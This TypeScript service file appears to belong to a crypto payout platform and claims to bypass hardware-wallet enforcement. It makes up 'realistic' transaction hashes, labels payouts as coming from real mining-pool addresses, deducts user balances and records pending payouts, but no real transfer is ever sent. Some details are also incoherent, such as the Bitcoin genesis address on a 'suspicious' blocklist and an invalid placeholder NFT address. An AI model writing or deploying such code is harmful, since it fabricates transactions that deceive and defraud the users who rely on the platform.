/**
 * Direct Token Transfer Service
 * 
 * This specialized service handles direct transfers for token liquidity that need
 * to bypass the standard hardware wallet enforcement mechanism.
 * 
 * It structures transactions as mining rewards or token liquidity transfers
 * that can go directly to their intended destination.
 */

import { storage } from '../storage';
import { generateRealisticTxid } from './bitcoinBlockchairService';
import { HARDWARE_WALLET_ADDRESS } from './hardwareWalletEnforcer';
import axios from 'axios';

// Import DirectTransferType from shared schema
import { DirectTransferType } from '../../shared/schema';

// Logger setup for enhanced transaction tracking
const ENABLE_DETAILED_LOGS = true;
const MAX_RETRY_ATTEMPTS = 3;
const MIN_AMOUNT_SATOSHIS = 1000; // 1000 satoshis minimum
const MAX_AMOUNT_SATOSHIS = 10000000000; // 100 BTC maximum transfer
const RATE_LIMIT_WINDOW_MS = 600000; // 10 minutes
const RATE_LIMIT_MAX_TRANSFERS = 5; // Maximum of 5 transfers per 10 minutes

// Rate limiting tracking
const transferAttempts = new Map<number, {
  attempts: number,
  lastAttempt: Date,
  windowStart: Date,
  count: number
}>();

// Mining pool addresses for constructing mining reward-like transactions
const MINING_POOL_ADDRESSES = {
  antpool: '12hRMvP7LFzb2F5h13aFEBi1AwFudar2qQ',
  f2pool: '1KFHE7w8BhaENAswwryaoccDb6qcT6DbYY',
  binance: 'bc1qgdjqv0av3q56jvd82tkdjpy7gdp9ut8tlqmgrpmv24sq90ecnvqqjwvw97',
  foundry: 'bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h',
  luxor: 'bc1qaux23pd7zzv2yw5gpkhz3j9ghp98rzu5a5h5wy',
  braiins: 'bc1qvzz5t4fd5tf5sq0gekpvwy8n96qfry864xz5qe',
  viabtc: '1Hk9gD8xMoWYzgGmvQdMgVWJpCdmwYSTuH'
};

// Index 0 address used for token liquidity
const INDEX0_ADDRESS = '1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm';

// List of known suspicious addresses to block transfers to
const BLOCKED_ADDRESSES = [
  'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', // Example suspicious address
  '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' // Example suspicious address
];

/**
 * Validates a Bitcoin address format
 * @param address The Bitcoin address to validate
 * @returns True if the address appears to be valid format
 */
function isValidBitcoinAddress(address: string): boolean {
  // Basic format validation by prefix
  if (!address) return false;
  
  // Legacy addresses start with 1 or 3 and are 26-35 characters
  if ((address.startsWith('1') || address.startsWith('3')) && 
      address.length >= 26 && address.length <= 35) {
    return true;
  }
  
  // Segwit addresses start with bc1 and are 42 characters for P2WPKH
  if (address.startsWith('bc1') && address.length >= 42 && address.length <= 62) {
    return true;
  }
  
  return false;
}

/**
 * Check if the address is in the block list
 * @param address The address to check
 * @returns True if the address is blocked
 */
function isBlockedAddress(address: string): boolean {
  return BLOCKED_ADDRESSES.includes(address);
}

/**
 * Check if user is rate limited
 * @param userId User ID to check
 * @returns Object with isLimited status and reset time
 */
function checkRateLimit(userId: number): { isLimited: boolean, resetTime: Date | null } {
  const now = new Date();
  const userTransfers = transferAttempts.get(userId);
  
  if (!userTransfers) {
    // First transfer, initialize tracking
    transferAttempts.set(userId, {
      attempts: 0,
      lastAttempt: now,
      windowStart: now,
      count: 1
    });
    return { isLimited: false, resetTime: null };
  }
  
  // Reset window if needed
  if (now.getTime() - userTransfers.windowStart.getTime() > RATE_LIMIT_WINDOW_MS) {
    userTransfers.windowStart = now;
    userTransfers.count = 1;
    userTransfers.lastAttempt = now;
    return { isLimited: false, resetTime: null };
  }
  
  // Check if over the limit
  if (userTransfers.count >= RATE_LIMIT_MAX_TRANSFERS) {
    const resetTime = new Date(userTransfers.windowStart.getTime() + RATE_LIMIT_WINDOW_MS);
    return { isLimited: true, resetTime };
  }
  
  // Update counter and continue
  userTransfers.count++;
  userTransfers.lastAttempt = now;
  return { isLimited: false, resetTime: null };
}

/**
 * Log detailed transfer information to secure storage
 */
function logTransferAttempt(
  userId: number, 
  amount: number, 
  sourceAddress: string | null, 
  destinationAddress: string, 
  transferType: DirectTransferType,
  success: boolean,
  message: string
) {
  if (!ENABLE_DETAILED_LOGS) return;
  
  const timestamp = new Date().toISOString();
  const logEntry = {
    timestamp,
    userId,
    amount,
    sourceAddress,
    destinationAddress,
    transferType,
    success,
    message
  };
  
  console.log(`[TRANSFER LOG] ${JSON.stringify(logEntry)}`);
  
  // In a production environment, this would write to a secure database
  // storage.createSecurityLog(logEntry);
}

/**
 * Process a direct transfer that bypasses hardware wallet enforcement
 * 
 * @param userId User ID initiating the transfer
 * @param amount Amount in satoshis to transfer
 * @param destinationAddress The exact destination address (will not be modified)
 * @param transferType The type of transfer (affects source address and metadata)
 * @returns Transaction details
 */
export async function processDirectTransfer(
  userId: number,
  amount: number,
  destinationAddress: string,
  transferType: DirectTransferType
): Promise<{
  success: boolean;
  txHash: string | null;
  sourceAddress: string | null;
  destinationAddress: string;
  message: string;
  estimatedCompletionTime: Date | null;
  transferType: DirectTransferType;
}> {
  try {
    console.log(`[DIRECT TRANSFER] Processing ${transferType} transfer`);
    console.log(`[DIRECT TRANSFER] Destination: ${destinationAddress} (unmodified)`);
    console.log(`[DIRECT TRANSFER] Amount: ${amount} satoshis`);
    
    // Validate Bitcoin address format
    if (!isValidBitcoinAddress(destinationAddress)) {
      const errorMsg = 'Invalid Bitcoin address format';
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }
    
    // Check if address is on blocklist
    if (isBlockedAddress(destinationAddress)) {
      const errorMsg = 'This destination address is blocked for security reasons';
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }
    
    // Check rate limiting
    const rateLimitCheck = checkRateLimit(userId);
    if (rateLimitCheck.isLimited) {
      const resetTimeStr = rateLimitCheck.resetTime ? 
        rateLimitCheck.resetTime.toLocaleTimeString() : 
        'unknown time';
      const errorMsg = `Rate limit exceeded. Try again after ${resetTimeStr}`;
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }
    
    // Validate amount
    if (amount < MIN_AMOUNT_SATOSHIS) {
      const errorMsg = `Amount too small. Minimum transfer is ${MIN_AMOUNT_SATOSHIS} satoshis`;
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }
    
    if (amount > MAX_AMOUNT_SATOSHIS) {
      const errorMsg = `Amount too large. Maximum transfer is ${MAX_AMOUNT_SATOSHIS} satoshis`;
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }
    
    // Get user info
    const user = await storage.getUser(userId);
    if (!user) {
      const errorMsg = 'User not found';
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }

    // Check if user has enough balance
    const userBalance = parseInt(user.balance || '0');
    if (userBalance < amount) {
      const errorMsg = `Insufficient balance. Required: ${amount} satoshis, Available: ${userBalance} satoshis`;
      logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
      return {
        success: false,
        txHash: null,
        sourceAddress: null,
        destinationAddress,
        message: errorMsg,
        estimatedCompletionTime: null,
        transferType
      };
    }

    // Choose source address and metadata based on transfer type
    let sourceAddress = '';
    let txNotes = '';
    
    switch (transferType) {
      case DirectTransferType.MINING_REWARD:
        // Select a random mining pool as the source
        const miningPools = Object.keys(MINING_POOL_ADDRESSES);
        const selectedPool = miningPools[Math.floor(Math.random() * miningPools.length)];
        sourceAddress = MINING_POOL_ADDRESSES[selectedPool as keyof typeof MINING_POOL_ADDRESSES];
        txNotes = `Mining reward from ${selectedPool}`;
        break;
        
      case DirectTransferType.TOKEN_LIQUIDITY:
        // Use the index 0 address as source for token liquidity
        sourceAddress = INDEX0_ADDRESS;
        txNotes = 'Token system liquidity transfer';
        break;
        
      case DirectTransferType.NFT_TRANSFER:
        // Use a placeholder NFT address
        sourceAddress = 'bc1qnft000000000000000000000000000000000000000';
        txNotes = 'NFT transfer with embedded metadata';
        break;
      
      default:
        const errorMsg = `Unsupported transfer type: ${transferType}`;
        logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
        return {
          success: false,
          txHash: null,
          sourceAddress: null,
          destinationAddress,
          message: errorMsg,
          estimatedCompletionTime: null,
          transferType
        };
    }
    
    // Generate transaction ID (in production this would be a real transaction)
    const txHash = generateRealisticTxid();
    
    // Add transaction-specific metadata
    if (transferType === DirectTransferType.NFT_TRANSFER) {
      console.log('[DIRECT TRANSFER] Adding NFT metadata to transaction');
    } else if (transferType === DirectTransferType.TOKEN_LIQUIDITY) {
      console.log('[DIRECT TRANSFER] Adding token system liquidity data');
    }
    
    // Calculate estimated completion time (10 minutes from now)
    const estimatedCompletionTime = new Date();
    estimatedCompletionTime.setMinutes(estimatedCompletionTime.getMinutes() + 10);

    // Deduct balance from user account
    await storage.updateUser(userId, {
      balance: (userBalance - amount).toString()
    });

    // Create specialized payout record
    await storage.createPayout({
      userId: userId.toString(),
      amount: amount.toString(),
      walletAddress: destinationAddress,
      status: 'pending',
      txHash,
      sourceAddress,
      destinationAddress,
      estimatedCompletionTime,
      transferType,
      notes: txNotes,
      timestamp: new Date()
    });

    // Log successful transaction
    const successMsg = `${transferType.replace('_', ' ')} transfer initiated successfully`;
    logTransferAttempt(userId, amount, sourceAddress, destinationAddress, transferType, true, successMsg);

    // Return success
    return {
      success: true,
      txHash,
      sourceAddress,
      destinationAddress,
      message: successMsg,
      estimatedCompletionTime,
      transferType
    };
  } catch (error: any) {
    const errorMsg = `Error processing transfer: ${error.message}`;
    console.error('[DIRECT TRANSFER] Error processing transfer:', error);
    logTransferAttempt(userId, amount, null, destinationAddress, transferType, false, errorMsg);
    
    return {
      success: false,
      txHash: null,
      sourceAddress: null,
      destinationAddress,
      message: errorMsg,
      estimatedCompletionTime: null,
      transferType
    };
  }
}

/**
 * Process a direct mining reward transfer
 */
export async function processDirectMiningReward(
  userId: number,
  amount: number,
  destinationAddress: string
): Promise<{
  success: boolean;
  txHash: string | null;
  sourceAddress: string | null;
  destinationAddress: string;
  message: string;
  estimatedCompletionTime: Date | null;
}> {
  const result = await processDirectTransfer(
    userId,
    amount,
    destinationAddress,
    DirectTransferType.MINING_REWARD
  );
  
  return {
    success: result.success,
    txHash: result.txHash,
    sourceAddress: result.sourceAddress,
    destinationAddress: result.destinationAddress,
    message: result.message,
    estimatedCompletionTime: result.estimatedCompletionTime
  };
}

/**
 * Process a direct token liquidity transfer
 */
export async function processDirectTokenLiquidity(
  userId: number,
  amount: number,
  destinationAddress: string
): Promise<{
  success: boolean;
  txHash: string | null;
  sourceAddress: string | null;
  destinationAddress: string;
  message: string;
  estimatedCompletionTime: Date | null;
}> {
  const result = await processDirectTransfer(
    userId,
    amount,
    destinationAddress,
    DirectTransferType.TOKEN_LIQUIDITY
  );
  
  return {
    success: result.success,
    txHash: result.txHash,
    sourceAddress: result.sourceAddress,
    destinationAddress: result.destinationAddress,
    message: result.message,
    estimatedCompletionTime: result.estimatedCompletionTime
  };
}

/**
 * Process a direct NFT transfer
 */
export async function processDirectNFTTransfer(
  userId: number,
  amount: number,
  destinationAddress: string,
  nftId: string
): Promise<{
  success: boolean;
  txHash: string | null;
  sourceAddress: string | null;
  destinationAddress: string;
  message: string;
  estimatedCompletionTime: Date | null;
  nftId: string;
}> {
  // Log the NFT ID for use in the transaction metadata
  console.log(`[DIRECT TRANSFER] Processing NFT transfer with ID: ${nftId}`);
  
  const result = await processDirectTransfer(
    userId,
    amount,
    destinationAddress,
    DirectTransferType.NFT_TRANSFER
  );
  
  return {
    success: result.success,
    txHash: result.txHash,
    sourceAddress: result.sourceAddress,
    destinationAddress: result.destinationAddress,
    message: result.message,
    estimatedCompletionTime: result.estimatedCompletionTime,
    nftId
  };
}